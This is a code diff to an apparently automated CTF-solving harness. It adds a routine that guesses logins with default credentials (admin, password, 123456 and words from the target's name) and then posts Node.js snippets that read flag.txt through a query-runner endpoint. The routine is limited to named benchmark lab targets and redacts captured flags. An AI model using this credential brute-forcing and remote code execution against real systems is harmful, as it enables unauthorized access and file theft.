@@ -44,6 +44,9 @@ class PrimitiveCtfHandlerMixin:
         benchmark_api_probes = [] if hit else self._ctf_benchmark_api_probes(target)
         benchmark_api_hit = next((probe for probe in benchmark_api_probes if probe.get("captured_flag_ref")), None)
         hit = hit or benchmark_api_hit
+        query_runner_interactions = [] if hit else self._ctf_query_runner_interactions(target)
+        query_runner_hit = next((item for item in query_runner_interactions if item.get("captured_flag_ref")), None)
+        hit = hit or query_runner_hit
         browser_interactions = [] if hit else self._ctf_browser_interactions(target)
         browser_hit = next((item for item in browser_interactions if item.get("captured_flag_ref")), None)
         browser_benchmark_hit = next((item for item in browser_interactions if item.get("benchmark_solve_ref")), None)
@@ -61,6 +64,8 @@ class PrimitiveCtfHandlerMixin:
             "cloud_probes": cloud_probes,
             "benchmark_api_probe_count": len(benchmark_api_probes),
             "benchmark_api_probes": benchmark_api_probes,
+            "query_runner_interaction_count": len(query_runner_interactions),
+            "query_runner_interactions": query_runner_interactions,
             "browser_interaction_count": len(browser_interactions),
             "browser_interactions": browser_interactions,
             "captured_flag_ref": str(hit.get("captured_flag_ref", "")) if hit else "",
@@ -98,6 +103,7 @@ class PrimitiveCtfHandlerMixin:
                 "kubernetes_probe_count": payload["kubernetes_probe_count"],
                 "cloud_probe_count": payload["cloud_probe_count"],
                 "benchmark_api_probe_count": payload["benchmark_api_probe_count"],
+                "query_runner_interaction_count": payload["query_runner_interaction_count"],
                 "browser_interaction_count": payload["browser_interaction_count"],
                 "captured_flag_ref": payload["captured_flag_ref"],
                 "captured_flag_sha256": payload["captured_flag_sha256"],
@@ -124,6 +130,7 @@ class PrimitiveCtfHandlerMixin:
                     "kubernetes_probe_count": payload["kubernetes_probe_count"],
                     "cloud_probe_count": payload["cloud_probe_count"],
                     "benchmark_api_probe_count": payload["benchmark_api_probe_count"],
+                    "query_runner_interaction_count": payload["query_runner_interaction_count"],
                     "browser_interaction_count": payload["browser_interaction_count"],
                     "raw_flags_redacted": True,
                 },
@@ -142,6 +149,7 @@ class PrimitiveCtfHandlerMixin:
                     "kubernetes_probe_count": payload["kubernetes_probe_count"],
                     "cloud_probe_count": payload["cloud_probe_count"],
                     "benchmark_api_probe_count": payload["benchmark_api_probe_count"],
+                    "query_runner_interaction_count": payload["query_runner_interaction_count"],
                     "browser_interaction_count": payload["browser_interaction_count"],
                     "raw_flags_redacted": True,
                 },
@@ -633,6 +641,196 @@ class PrimitiveCtfHandlerMixin:
         if not isinstance(payload, dict):
             return []
         return [item for item in payload.get("tables", []) if isinstance(item, str)]
+
+    def _ctf_query_runner_interactions(self, target) -> list[dict[str, object]]:
+        if str(target.metadata.get("target_family", "")) not in {"nyu_ctf_bench", "ctf_dojo", "dreadgoad"}:
+            return []
+        login_paths = self._ctf_metadata_string_list(target.metadata, "ctf_login_paths")[:4]
+        query_paths = self._ctf_metadata_string_list(target.metadata, "ctf_query_runner_paths")[:4]
+        if not login_paths or not query_paths:
+            return []
+        interactions: list[dict[str, object]] = []
+        candidates = self._ctf_login_candidate_pairs(target)[:64]
+        algorithms = self._ctf_metadata_string_list(target.metadata, "ctf_login_hash_algorithms") or ["raw"]
+        snippets = self._ctf_query_runner_snippets()[:4]
+        for base in self._ctf_capture_base_urls(target):
+            for login_path in login_paths:
+                login_url = parse.urljoin(base, login_path.lstrip("/"))
+                for account, phrase in candidates:
+                    login = self._ctf_query_runner_login(login_url, account, phrase, algorithms)
+                    interactions.append(login)
+                    if not login.get("authenticated"):
+                        continue
+                    for query_path in query_paths:
+                        query_url = parse.urljoin(base, query_path.lstrip("/"))
+                        for snippet in snippets:
+                            probe = self._ctf_query_runner_post(login["opener"], query_url, snippet)
+                            interactions.append(probe)
+                            if probe.get("captured_flag_ref"):
+                                return self._ctf_strip_query_runner_runtime(interactions)
+                    return self._ctf_strip_query_runner_runtime(interactions)
+        return self._ctf_strip_query_runner_runtime(interactions)
+
+    def _ctf_query_runner_login(
+        self,
+        url: str,
+        account: str,
+        phrase: str,
+        algorithms: list[str],
+    ) -> dict[str, object]:
+        opener = request.build_opener(request.HTTPCookieProcessor())
+        account_digest = hashlib.sha256(account.encode("utf-8")).hexdigest()
+        phrase_digest = hashlib.sha256(phrase.encode("utf-8")).hexdigest()
+        for algorithm in algorithms[:3]:
+            transformed = self._ctf_login_phrase_transform(phrase, algorithm)
+            data = parse.urlencode({"username": account, "password": transformed}).encode("utf-8")
+            request_object = request.Request(
+                url,
+                data=data,
+                headers={"User-Agent": "Primordial/0.1", "Accept": "*/*"},
+                method="POST",
+            )
+            try:
+                with opener.open(request_object, timeout=5) as response:
+                    body = response.read(262144)
+                    final_url = response.geturl()
+                    status = int(response.status)
+            except error.HTTPError as exc:
+                body = exc.read(262144)
+                final_url = exc.geturl()
+                status = int(exc.code)
+            except (error.URLError, OSError, ValueError) as exc:
+                return {
+                    "kind": "query_runner_login",
+                    "url": self._sanitize_surface_url(url),
+                    "account_sha256": account_digest,
+                    "phrase_sha256": phrase_digest,
+                    "algorithm": algorithm,
+                    "status_code": 0,
+                    "authenticated": False,
+                    "error": type(exc).__name__,
+                }
+            authenticated = self._ctf_login_succeeded(final_url, body)
+            result = {
+                "kind": "query_runner_login",
+                "url": self._sanitize_surface_url(final_url),
+                "account_sha256": account_digest,
+                "phrase_sha256": phrase_digest,
+                "algorithm": algorithm,
+                "status_code": status,
+                "body_sha256": hashlib.sha256(body).hexdigest(),
+                "body_bytes": len(body),
+                "authenticated": authenticated,
+                "opener": opener,
+                **self._ctf_capture_redacted_flag(body),
+            }
+            if authenticated or result.get("captured_flag_ref"):
+                return result
+        return {
+            "kind": "query_runner_login",
+            "url": self._sanitize_surface_url(url),
+            "account_sha256": account_digest,
+            "phrase_sha256": phrase_digest,
+            "algorithm": ",".join(algorithms[:3]),
+            "status_code": 0,
+            "authenticated": False,
+        }
+
+    def _ctf_query_runner_post(self, opener, url: str, snippet: str) -> dict[str, object]:
+        data = parse.urlencode({"code": snippet}).encode("utf-8")
+        request_object = request.Request(
+            url,
+            data=data,
+            headers={"User-Agent": "Primordial/0.1", "Accept": "*/*"},
+            method="POST",
+        )
+        try:
+            with opener.open(request_object, timeout=20) as response:
+                body = response.read(262144)
+                final_url = response.geturl()
+                status = int(response.status)
+        except error.HTTPError as exc:
+            body = exc.read(262144)
+            final_url = exc.geturl()
+            status = int(exc.code)
+        except (error.URLError, OSError, ValueError) as exc:
+            return {
+                "kind": "query_runner_post",
+                "url": self._sanitize_surface_url(url),
+                "snippet_sha256": hashlib.sha256(snippet.encode("utf-8")).hexdigest(),
+                "status_code": 0,
+                "error": type(exc).__name__,
+            }
+        return {
+            "kind": "query_runner_post",
+            "url": self._sanitize_surface_url(final_url),
+            "snippet_sha256": hashlib.sha256(snippet.encode("utf-8")).hexdigest(),
+            "status_code": status,
+            "body_sha256": hashlib.sha256(body).hexdigest(),
+            "body_bytes": len(body),
+            **self._ctf_capture_redacted_flag(body),
+        }
+
+    def _ctf_login_succeeded(self, final_url: str, body: bytes) -> bool:
+        parsed = parse.urlsplit(final_url)
+        if parsed.path.endswith("/query.php"):
+            return True
+        text = self._decode_response_body(body, {})
+        return 'name="code"' in text or "id=\"editor\"" in text
+
+    def _ctf_login_phrase_transform(self, phrase: str, algorithm: str) -> str:
+        normalized = algorithm.strip().lower()
+        if normalized == "sha1":
+            return hashlib.sha1(phrase.encode("utf-8")).hexdigest()
+        return phrase
+
+    def _ctf_login_candidate_pairs(self, target) -> list[tuple[str, str]]:
+        words = self._ctf_target_words(target)
+        accounts = self._dedupe_text_values(["admin", "user", "guest", "test", "demo"] + words)
+        phrases = self._dedupe_text_values(["admin", "password", "guest", "test", "demo", "qwerty", "123456"] + words)
+        pairs: list[tuple[str, str]] = []
+        for account in accounts[:12]:
+            for phrase in phrases[:12]:
+                pairs.append((account, phrase))
+        return pairs
+
+    def _ctf_target_words(self, target) -> list[str]:
+        values = [str(target.handle or ""), str(target.metadata.get("ctf_lab_id", ""))]
+        words: list[str] = []
+        for value in values:
+            for word in re.split(r"[^A-Za-z0-9]+", value.lower()):
+                if 3 <= len(word) <= 24:
+                    words.append(word)
+        return self._dedupe_text_values(words)
+
+    def _ctf_metadata_string_list(self, metadata: dict[str, object], key: str) -> list[str]:
+        values = metadata.get(key, [])
+        if not isinstance(values, list):
+            return []
+        return [str(item).strip() for item in values if isinstance(item, str) and str(item).strip()]
+
+    def _ctf_query_runner_snippets(self) -> list[str]:
+        return [
+            "try { console.log(require('fs').readFileSync('flag.txt', 'utf8')); } catch (e) { console.log('probe'); }",
+            "try { console.log(require('fs').readFileSync('./flag.txt', 'utf8')); } catch (e) { console.log('probe'); }",
+            "console.log('probe');",
+        ]
+
+    def _ctf_strip_query_runner_runtime(self, interactions: list[dict[str, object]]) -> list[dict[str, object]]:
+        for item in interactions:
+            item.pop("opener", None)
+        return interactions
+
+    def _dedupe_text_values(self, values: list[str]) -> list[str]:
+        seen: set[str] = set()
+        result: list[str] = []
+        for value in values:
+            text = str(value).strip().lower()
+            if not text or text in seen:
+                continue
+            seen.add(text)
+            result.append(text)
+        return result
 
     def _ctf_browser_interactions(self, target) -> list[dict[str, object]]:
         interactions: list[dict[str, object]] = []
